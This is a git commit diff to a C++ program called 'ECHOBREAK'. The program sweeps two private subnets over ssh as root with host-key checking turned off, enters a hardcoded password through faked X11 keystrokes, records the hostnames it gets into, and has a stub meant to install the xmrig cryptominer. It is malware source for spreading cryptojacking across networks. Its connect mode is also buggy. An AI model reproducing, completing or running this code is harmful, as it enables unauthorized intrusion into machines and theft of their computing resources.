1755ed23f161f843524a468a6f2c9b4ba78777b2
zntwpp <97395432+zntwpp@users.noreply.github.com>
2025-02-05 21:43:35 +0300

    Update installer.cpp

--- installer.cpp
+++ installer.cpp
@@ -1,13 +1,13 @@
-#include <stdlib.h>
 #include <iostream>
 #include <unistd.h>
-#include <X11/Xlib.h>
 #include <X11/keysym.h>
 #include <X11/extensions/XTest.h>
 #include <memory>
 #include <fstream>
 #include <vector>
 #include <array>
+//#include <X11/Xlib.h>
+//#include <stdlib.h>
 
 void emulate_keyboard(std::string inp){
 	Display *display;
@@ -17,13 +17,11 @@ void emulate_keyboard(std::string inp){
 	keycode = XKeysymToKeycode(display, c);
 	XTestFakeKeyEvent(display, keycode, True, 0);
 	XTestFakeKeyEvent(display, keycode, False, 0);
-	sleep(0.1);
 	XFlush(display);
 	}
 	keycode = XKeysymToKeycode(display, XK_KP_Enter);
 	XTestFakeKeyEvent(display, keycode, True, 0);
 	XTestFakeKeyEvent(display, keycode, False, 0);
-	sleep(0.1);
 	XFlush(display);
 	XCloseDisplay(display);
 }
@@ -63,34 +61,52 @@ void setup(){
 	//ur func to setup worker and download xmrig
 }
 
-int main(){
+void connect(std::string ip){
+	//coming soon
+}
+
+int main(int argc, char* argv[]){
 	std::cout << "W3LC0M T0 ECHOBREAK!!" << std::endl;
 	std::string ip;
 	std::vector<std::string> hosts;
-	for(int i = 2; i < 256; ++i){
-		//checking for 112
-		ip = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3  root@172.17.212." + std::to_string(i); //ip
-		if(check_connection(exec(ip.c_str()))){ 
-			emulate_keyboard("1347QwAsZx"); //entering password
-			hosts.push_back(exec("hostname") + " " + std::to_string(i)); //to ip data base
-			setup(); // ur func
-			system("exit");
-		}
-		//checking for 113
-		ip = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@172.17.213." + std::to_string(i); //ip
-		if(check_connection(exec(ip.c_str()))){
-			emulate_keyboard("1347QwAsZx"); //entering password
-			hosts.push_back(exec("hostname") + " " + std::to_string(i)); //to ip data base
-			setup(); // ur func
-			system("exit");
-		}
+	
+	if(argc <= 1){
+		std::cout << "use -scan or -connect [ip]\n ";
+		return 1;
 	}
+	
+	std::string arg = argv[1];
 
-	std::ofstream out("hosts.txt", std::ios::out); //open file to rewrite all data
-	for(auto host : hosts){ // for each loop
-		out << host << std::endl; // write
+	if(arg == "scan"){
+		for(int i = 2; i < 256; ++i){
+			//checking for 112
+			ip = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i); //ip
+			if(check_connection(exec(ip.c_str()))){ 
+				emulate_keyboard("1347QwAsZx"); //entering password
+				hosts.push_back(exec("hostname") + " " + std::to_string(i)); //to ip data base
+				setup(); // ur func
+				system("exit");
+			}
+			//checking for 113
+			ip = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@172.17.213." + std::to_string(i); //ip
+			if(check_connection(exec(ip.c_str()))){
+				emulate_keyboard("1347QwAsZx"); //entering password
+				hosts.push_back(exec("hostname") + " " + std::to_string(i)); //to ip data base
+				setup(); // ur func
+				system("exit");
+			}
+		}
+
+		std::ofstream out("hosts.txt", std::ios::out); //open file to rewrite all data
+		for(auto host : hosts){ // for each loop
+			out << host << std::endl; // write
+		}
+		out.close(); // close file
+	}	
+	else if(arg == "connect"){
+		std::string ip = argv[1];
+		connect(ip);
 	}
-	out.close(); // close file
 	
 	return 0xABCDEF;
 }
